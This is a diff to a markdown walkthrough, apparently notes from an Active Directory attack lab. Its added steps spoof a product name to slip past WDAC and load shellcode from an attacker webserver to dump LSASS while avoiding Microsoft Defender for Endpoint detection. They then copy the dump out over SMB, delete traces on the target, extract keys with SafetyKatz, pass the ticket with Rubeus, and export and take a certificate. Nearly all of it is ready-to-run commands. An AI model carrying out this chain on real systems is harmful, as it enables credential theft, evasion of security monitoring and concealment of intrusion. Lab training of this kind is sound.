@@ -145,7 +145,7 @@ To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workst
 NOTE: msvcp140.dll, vcruntime140.dll, vcruntime140_1.dll are mockingjay dependency DLLs (located at \windows\system32) which are transferred too because WDAC is enabled on the target and would block them, while mscorlib.ni.dll is the DLL with the free RWX section to perform Self Process Injection in.
 
 ```
-cd C:\AD\Tools\mockingja
+cd C:\AD\Tools\mockingjay
 ```
 
 ```
@@ -167,6 +167,8 @@ C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --se
 ```
 C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
 ```
+
+Powershell
 
 ```
 Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll, C:\AD\Tools\mockingjay\vcruntime140.dll, C:\AD\Tools\mockingjay\vcruntime140_1.dll, C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath "C:\AD\Tools\mockingjay\mockingjay.zip"
@@ -198,3 +200,87 @@ detection on MDE. Wait a few seconds for the download to complete.
 ```
 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.139/mockingjay.zip
 ```
+
+Now extract the contents from the mockingjay.zip archive using tar and attempt to perform an LSASS dump invoking the nano.bin shellcode hosted on our studentvm webserver.
+
+```
+tar -xf C:\Users\jumpone$\Downloads\mockingjay.zip
+```
+
+```
+C:\Users\jumpone$\Downloads\mockingjay.exe 192.168.100.139 "/nano.bin"
+```
+
+![[Pasted image 20250318135457.png]]
+
+An LSASS dump file is written called nano.dmp with an invalid signature since a normal LSASS dump on disk could trigger an MDE detection. We will now exfiltrate this dump file, restore and parse it for credentials. 
+
+Before doing so exit out of the winrs session and perform exfiltration using SMB along with a cleanup of all files used on the target.
+
+```
+copy \\us-jump7.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Tools\mockingjay
+```
+
+![[Pasted image 20250318135637.png]]
+
+```
+del \\us-jump X.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\*
+```
+
+![[Pasted image 20250318135747.png]]
+
+Finally, restore the exfiltrated dump signature and parse credentials using mimikatz as follows:
+
+```
+C:\AD\Tools\mockingjay\restore_signature.exe C:\AD\Tools\mockingjay\nano.dmp
+```
+
+![[Pasted image 20250318135830.png]]
+
+Extract credentials from the dump file:
+
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% C:\AD\Tools\mockingjay\nano.dmp" "sekurlsa::keys" "exit"
+```
+
+![[Pasted image 20250318135946.png]]
+
+
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /domain:us.techcorp.local /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Run the below commands in the new process to enumerate the LocalMachine certificate store:
+
+```
+winrs -r:us-jump7 cmd
+```
+
+
+```
+certutil -store My
+```
+
+```
+certutil -exportpfx -p SecretPass@123 7700000029b60d1d1ae7222be2000100000029 C:\Users\pawadmin\Downloads\pawadmin.pfx
+```
+We can now export this certificate in a pfx format as follows:
+
+![[Pasted image 20250318153016.png]]
+
+Disconnect from the winrs session and exfiltrate the certificate back onto our student VM. Be sure to perform a cleanup after.
+
+```
+copy \\us-jump7.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\
+```
+
+```
+del \\us-jump7.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\*
+```
+
+![[Pasted image 20250318153330.png]]
+
+We will use this certificate later!
+
+### Credentials Extraction – Generates events in MDE
+
